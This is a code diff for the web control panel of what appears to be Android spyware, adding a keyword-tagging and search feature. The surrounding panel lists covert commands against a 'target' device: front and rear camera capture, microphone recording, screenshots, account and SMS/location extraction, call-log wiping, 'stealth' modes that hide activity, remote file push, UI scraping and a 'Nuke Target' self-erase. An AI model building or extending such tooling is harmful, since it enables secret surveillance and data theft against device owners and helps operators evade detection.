@@ -106,6 +106,9 @@
 
         .btn-status { width: 30px; background: rgba(0, 243, 255, 0.1); border: 1px solid #333; color: var(--primary); font-size: 0.6rem; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
         .btn-status:hover { border-color: var(--primary); }
+        .btn-tag { width: 25px; background: transparent; border: 1px solid #333; color: #555; font-size: 0.6rem; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; margin-right: 2px; }
+        .btn-tag:hover { color: var(--primary); border-color: var(--primary); }
+        .btn-tag.active { color: var(--success); border-color: var(--success); }
 
         #toast-container { position: fixed; top: 80px; right: 20px; z-index: 1000; pointer-events: none; }
         .toast { background: var(--surface); border-left: 4px solid var(--primary); padding: 12px 20px; margin-bottom: 10px; font-size: 0.8rem; box-shadow: 0 5px 15px rgba(0,0,0,0.5); animation: toastIn 0.3s ease forwards; opacity: 0; }
@@ -199,21 +202,21 @@
         <div id="view-cmd" class="section">
             <h2 data-search="interference, alerts, signals, comms, ring, ping, toast, intent">Interference</h2>
             <div class="card">
-                <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('TOAST')">?</button><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('TOAST', this)" title="Add Search Index">🏷️</button><button class="btn-status" onclick="auditCmd('TOAST')">?</button><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
                 <div class="cmd-row">
                     <label class="cmd-label">Vocal Synthesis (TTS)</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('SPEAK_TEXT')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('SPEAK_TEXT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SPEAK_TEXT')">?</button>
                         <input type="text" id="speak-text" placeholder="Message to speak..." style="flex:1">
                         <input type="number" id="speak-vol" value="80" title="Volume %" style="width:50px">
                         <button class="btn" onclick="sendCmd('SPEAK_TEXT')">Speak</button>
                     </div>
                 </div>
-                <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('RING')">?</button><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('RING', this)">🏷️</button><button class="btn-status" onclick="auditCmd('RING')">?</button><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
                 <div class="cmd-row">
                     <label class="cmd-label">Notification Wipe</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('WIPE_NOTIFICATIONS')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('WIPE_NOTIFICATIONS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('WIPE_NOTIFICATIONS')">?</button>
                         <select id="wipe-mode" style="width:70px; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                             <option value="ALL">ALL</option>
                             <option value="PKG">PKG</option>
@@ -226,7 +229,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Audio Infrastructure</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('VOLUME')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('VOLUME', this)">🏷️</button><button class="btn-status" onclick="auditCmd('VOLUME')">?</button>
                         <select id="vol-stream" style="width:70px; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                             <option value="RING">RING</option>
                             <option value="MEDIA">MEDIA</option>
@@ -239,7 +242,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Screen Latency (Timeout)</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('SCREEN_TIMEOUT')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('SCREEN_TIMEOUT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SCREEN_TIMEOUT')">?</button>
                         <input type="number" id="val-timeout" placeholder="Seconds (e.g. 30)" style="flex:1">
                         <button class="btn" onclick="sendCmd('SCREEN_TIMEOUT')">SET</button>
                     </div>
@@ -247,21 +250,21 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Connectivity & Identity</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('PING')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('PING', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PING')">?</button>
                         <button class="btn" style="flex:1" onclick="sendCmd('PING')">Ping Probe</button>
                     </div>
                     <div class="input-wrap" style="margin-top:5px">
-                        <button class="btn-status" onclick="auditCmd('GET_TOKEN')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('GET_TOKEN', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_TOKEN')">?</button>
                         <button class="btn" style="flex:1" onclick="sendCmd('GET_TOKEN')">Fetch Token</button>
                     </div>
                 </div>
-                <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('WAKE')">?</button><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('WAKE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('WAKE')">?</button><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
                 <div class="cmd-row">
                     <label class="cmd-label">Remote Intent</label>
                     <input type="text" id="int-act" value="android.intent.action.VIEW" placeholder="Action">
                     <input type="text" id="int-data" placeholder="Data (URL/URI)">
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('RUN_INTENT')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('RUN_INTENT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('RUN_INTENT')">?</button>
                         <select id="int-tgt" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;">
                             <option value="activity">Activity</option>
                             <option value="service">Service</option>
@@ -277,7 +280,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Display Authority (Dimmer)</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('BRIGHTNESS')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('BRIGHTNESS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('BRIGHTNESS')">?</button>
                         <input type="number" id="bri-level" value="0" placeholder="0-100" style="width:60px">
                         <select id="bri-method" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                             <option value="ACC">ACC (STEALTH)</option>
@@ -288,14 +291,14 @@
                         <button class="btn" onclick="sendCmd('BRIGHTNESS')">GO</button>
                     </div>
                     <div class="input-wrap" style="margin-top:5px">
-                        <button class="btn-status" onclick="auditCmd('UNBLIND')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('UNBLIND', this)">🏷️</button><button class="btn-status" onclick="auditCmd('UNBLIND')">?</button>
                         <button class="btn" style="flex:1" onclick="sendCmd('UNBLIND')">MASTER RESET (UNBLIND)</button>
                     </div>
                 </div>
                 <div class="cmd-row">
                     <label class="cmd-label">Display Snapshot</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('GET_SCREENSHOT')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('GET_SCREENSHOT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SCREENSHOT')">?</button>
                         <input type="number" id="scr-quality" value="70" placeholder="Quality %" style="flex:1">
                         <button class="btn" onclick="sendCmd('GET_SCREENSHOT')">Screenshot</button>
                     </div>
@@ -303,7 +306,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Optical Capture</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('CAPTURE_IMAGE')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('CAPTURE_IMAGE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('CAPTURE_IMAGE')">?</button>
                         <select id="cam-side" style="width:80px; background:#000; color:var(--primary); border:1px solid var(--surface-light);"><option value="REAR">Rear</option><option value="FRONT">Front</option></select>
                         <input type="number" id="cam-count" value="1" placeholder="Qty" style="width:60px">
                         <button class="btn" onclick="sendCmd('CAPTURE_IMAGE')">Capture</button>
@@ -312,7 +315,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Acoustic Snippet</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('RECORD_VOICE')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('RECORD_VOICE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('RECORD_VOICE')">?</button>
                         <input type="number" id="mic-dur" value="10" placeholder="Secs">
                         <button class="btn" onclick="sendCmd('RECORD_VOICE')">Record Mic</button>
                     </div>
@@ -334,7 +337,7 @@
                     </div>
                     <textarea id="touch-json-raw" placeholder="[ { &quot;type&quot;: &quot;NAV&quot;, &quot;val&quot;: &quot;BACK&quot; } ]" style="font-size:0.6rem; min-height:40px; margin-bottom:5px;"></textarea>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('REMOTE_TOUCH')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('REMOTE_TOUCH', this)">🏷️</button><button class="btn-status" onclick="auditCmd('REMOTE_TOUCH')">?</button>
                         <button class="btn danger" onclick="clearTouchChain()" style="font-size:0.7rem;">RESET</button>
                         <button class="btn" style="flex:1" onclick="sendCmd('REMOTE_TOUCH')">BROADCAST CHAIN</button>
                     </div>
@@ -346,7 +349,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Accessibility Audit (UI Scraper)</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('GET_TREE')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('GET_TREE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_TREE')">?</button>
                         <input type="text" id="tree-pkg" placeholder="Package (null for all)" style="flex:1">
                         <input type="number" id="tree-dur" value="1" title="Duration (Mins)" style="width:50px">
                         <input type="number" id="tree-depth" value="10" title="Walk Depth" style="width:50px">
@@ -356,7 +359,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Call Log Sanitizer</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('PHONE_LOGS')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('PHONE_LOGS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PHONE_LOGS')">?</button>
                         <select id="call-act" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                             <option value="CLEAR_ALL">Wipe All Logs</option>
                             <option value="DELETE_LAST">Wipe Last (Mins)</option>
@@ -366,7 +369,7 @@
                         <button class="btn" onclick="sendCmd('PHONE_LOGS')">Sanitize</button>
                     </div>
                 </div>
-                <div class="cmd-row"><label class="cmd-label">Forensic File Pull</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('PULL_FILE')">?</button><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Forensic File Pull</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('PULL_FILE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PULL_FILE')">?</button><input type="text" id="val-pull" placeholder="/sdcard/Download/file.jpg"><button class="btn" onclick="sendCmd('PULL_FILE')">Fetch</button></div></div>
                 <div class="cmd-row">
                     <label class="cmd-label">Remote Deployment (Push)</label>
                     <div style="display:flex; gap:5px; margin-bottom:5px;">
@@ -376,29 +379,29 @@
                         </label>
                     </div>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('PUSH_FILE')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('PUSH_FILE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('PUSH_FILE')">?</button>
                         <input type="text" id="push-path" placeholder="/sdcard/Download/filename.ext" style="flex:1">
                         <button class="btn" id="push-deploy-btn" onclick="handlePushDeployment()">Deploy</button>
                     </div>
                 </div>
-                <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Vault Storage Status</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Query Vault Size</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Identity Extraction</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_ACCOUNTS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_ACCOUNTS')">Fetch System Accounts</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Environmental Audit (Sensors)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_SENSORS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_SENSORS')">Sample Physical State</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Forensic Sync (Cloud)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('UPLOAD_DUMPS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Vault Dumps</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Diagnostic System Logs</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_LOGS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_LOGS')">Export Logcat</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">User Engagement (7D Trend)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_ENGAGEMENT')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_ENGAGEMENT')">Fetch Usage Metrics</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_SKELETON', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Vault Storage Status</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_VAULT_SIZE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Query Vault Size</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Identity Extraction</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_ACCOUNTS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_ACCOUNTS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_ACCOUNTS')">Fetch System Accounts</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Environmental Audit (Sensors)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_SENSORS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SENSORS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_SENSORS')">Sample Physical State</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Forensic Sync (Cloud)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('UPLOAD_DUMPS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('UPLOAD_DUMPS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Vault Dumps</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Diagnostic System Logs</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_LOGS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_LOGS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_LOGS')">Export Logcat</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">User Engagement (7D Trend)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_ENGAGEMENT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_ENGAGEMENT')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_ENGAGEMENT')">Fetch Usage Metrics</button></div></div>
             </div>
 
             <h2 data-search="maintenance, gear, interval, pulse, sync, ready, work, burst">Maintenance</h2>
             <div class="card">
-                <div class="cmd-row"><label class="cmd-label">Burst Mode (Stay Ready)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('STAY_READY')">?</button><input type="number" id="val-burst" placeholder="Mins (e.g. 15)"><button class="btn" onclick="sendCmd('STAY_READY')">Activate</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Work Cycle</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('SET_INTERVAL')">?</button><input type="number" id="val-work" placeholder="Mins (Min 15)"><button class="btn" onclick="sendCmd('SET_INTERVAL')">Set</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Logging System (Live Debugger)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('TOGGLE_LOGGING')">?</button><select id="log-state" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="ON">SYSTEM_ON (LOGGING)</option><option value="OFF">SYSTEM_OFF (STEALTH)</option></select><button class="btn" onclick="sendCmd('TOGGLE_LOGGING')">Toggle</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Burst Mode (Stay Ready)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('STAY_READY', this)">🏷️</button><button class="btn-status" onclick="auditCmd('STAY_READY')">?</button><input type="number" id="val-burst" placeholder="Mins (e.g. 15)"><button class="btn" onclick="sendCmd('STAY_READY')">Activate</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Work Cycle</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('SET_INTERVAL', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_INTERVAL')">?</button><input type="number" id="val-work" placeholder="Mins (Min 15)"><button class="btn" onclick="sendCmd('SET_INTERVAL')">Set</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Logging System (Live Debugger)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('TOGGLE_LOGGING', this)">🏷️</button><button class="btn-status" onclick="auditCmd('TOGGLE_LOGGING')">?</button><select id="log-state" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="ON">SYSTEM_ON (LOGGING)</option><option value="OFF">SYSTEM_OFF (STEALTH)</option></select><button class="btn" onclick="sendCmd('TOGGLE_LOGGING')">Toggle</button></div></div>
                 <div class="cmd-row">
                     <label class="cmd-label">Feature Control</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('TOGGLE_FEATURE')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('TOGGLE_FEATURE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('TOGGLE_FEATURE')">?</button>
                         <input type="text" id="tog-feat" placeholder="Feature (e.g. location)">
                         <select id="tog-state" style="background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                             <option value="on">ON</option>
@@ -411,7 +414,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Force Extraction (Modules:Limit)</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('FORCE_UPLOAD')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('FORCE_UPLOAD', this)">🏷️</button><button class="btn-status" onclick="auditCmd('FORCE_UPLOAD')">?</button>
                         <input type="text" id="val-force" placeholder="e.g. sms:50, location, usage" value="ALL">
                         <button class="btn" onclick="sendCmd('FORCE_UPLOAD')">Extract</button>
                     </div>
@@ -423,7 +426,7 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Code Red (Beacon)</label>
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('CODERED')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('CODERED', this)">🏷️</button><button class="btn-status" onclick="auditCmd('CODERED')">?</button>
                         <input type="text" id="cr-code" value="0" placeholder="Codes" style="width:60px">
                         <input type="number" id="cr-dur" value="15" placeholder="Mins">
                         <input type="number" id="cr-freq" value="30" placeholder="Freq(s)">
@@ -432,13 +435,13 @@
                 </div>
                 <div class="cmd-row">
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('STOP_BEACON')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('STOP_BEACON', this)">🏷️</button><button class="btn-status" onclick="auditCmd('STOP_BEACON')">?</button>
                         <button class="btn danger" style="flex:1" onclick="sendCmd('STOP_BEACON')">Dark Mode (Stop Beacon)</button>
                     </div>
                 </div>
                 <div class="cmd-row" style="margin-top:10px;">
                     <div class="input-wrap">
-                        <button class="btn-status" onclick="auditCmd('NUKE')">?</button>
+                        <button class="btn-tag" onclick="tagCmd('NUKE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('NUKE')">?</button>
                         <button class="btn danger" style="flex:1" onclick="if(confirm('PURGE DATA & UNINSTALL?')) sendCmd('NUKE')">Nuke Target</button>
                     </div>
                 </div>
@@ -509,6 +512,7 @@
             setInterval(fetchLatest, 5000);
             fetchFiles(); // Initial load
             initSearchSuggestions();
+            refreshTagStates();
         };
 
         function initSearchSuggestions() {
@@ -1209,38 +1213,80 @@
             if (!isVisible) input.focus();
         }
 
+        function tagCmd(cmdKey, btn) {
+            const tags = JSON.parse(localStorage.getItem('cortex_cmd_tags') || '{}');
+            const existing = tags[cmdKey] || '';
+            const newVal = prompt(`ADD SEARCH KEYWORDS FOR [${cmdKey}]:\n(Comma separated)`, existing);
+            
+            if (newVal !== null) {
+                if (newVal.trim() === '') delete tags[cmdKey];
+                else tags[cmdKey] = newVal.trim().toLowerCase();
+                localStorage.setItem('cortex_cmd_tags', JSON.stringify(tags));
+                refreshTagStates();
+                initSearchSuggestions();
+            }
+        }
+
+        function refreshTagStates() {
+            const tags = JSON.parse(localStorage.getItem('cortex_cmd_tags') || '{}');
+            document.querySelectorAll('.btn-tag').forEach(btn => {
+                const onclickAttr = btn.getAttribute('onclick');
+                const match = onclickAttr.match(/tagCmd\('([^']+)'/);
+                if (match && tags[match[1]]) btn.classList.add('active');
+                else btn.classList.remove('active');
+            });
+        }
+
         function executeSearch() {
             const term = document.getElementById('search-input').value.toLowerCase().trim();
             if (!term) return;
             
-            const headers = document.querySelectorAll('h2[data-search]');
-            let found = false;
+            const tags = JSON.parse(localStorage.getItem('cortex_cmd_tags') || '{}');
+            let foundElement = null;
 
-            for (const h of headers) {
-                const keywords = h.getAttribute('data-search').split(',').map(k => k.trim());
-                if (keywords.some(k => k.includes(term)) || h.innerText.toLowerCase().includes(term)) {
-                    // 1. Identify parent section and switch tab
-                    const section = h.closest('.section');
-                    const tabId = section.id.replace('view-', '');
-                    switchTab(tabId);
-
-                    // 2. Scroll and Highlight
-                    setTimeout(() => {
-                        h.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                        const card = h.nextElementSibling;
-                        if (card && card.classList.contains('card')) {
-                            card.classList.add('search-highlight');
-                            setTimeout(() => card.classList.remove('search-highlight'), 2000);
-                        }
-                    }, 100);
-
-                    found = true;
-                    break;
+            // 1. Check Dynamic Tags First
+            for (const [cmdKey, keywords] of Object.entries(tags)) {
+                if (keywords.split(',').some(k => k.trim().includes(term))) {
+                    const btn = document.querySelector(`.btn-tag[onclick*="'${cmdKey}'"]`);
+                    if (btn) { foundElement = btn.closest('.cmd-row') || btn.closest('.card'); break; }
                 }
             }
 
-            if (found) toggleSearch();
-            else toast("NO MATCHING SECTOR FOUND", "danger");
+            // 2. Check Static Headers
+            if (!foundElement) {
+                const headers = document.querySelectorAll('h2[data-search]');
+                for (const h of headers) {
+                    const keywords = h.getAttribute('data-search').split(',').map(k => k.trim());
+                    if (keywords.some(k => k.includes(term)) || h.innerText.toLowerCase().includes(term)) {
+                        foundElement = h; break;
+                    }
+                }
+            }
+
+            // 3. Check Labels
+            if (!foundElement) {
+                const labels = document.querySelectorAll('.cmd-label, label');
+                for (const l of labels) {
+                    if (l.innerText.toLowerCase().includes(term)) {
+                        foundElement = l.closest('.cmd-row') || l; break;
+                    }
+                }
+            }
+
+            if (foundElement) {
+                const section = foundElement.closest('.section');
+                const tabId = section.id.replace('view-', '');
+                switchTab(tabId);
+
+                setTimeout(() => {
+                    foundElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    foundElement.classList.add('search-highlight');
+                    setTimeout(() => foundElement.classList.remove('search-highlight'), 2000);
+                }, 150);
+                toggleSearch();
+            } else {
+                toast("NO MATCHING SECTOR FOUND", "danger");
+            }
         }
 
         function saveFolderNote(name, event) {
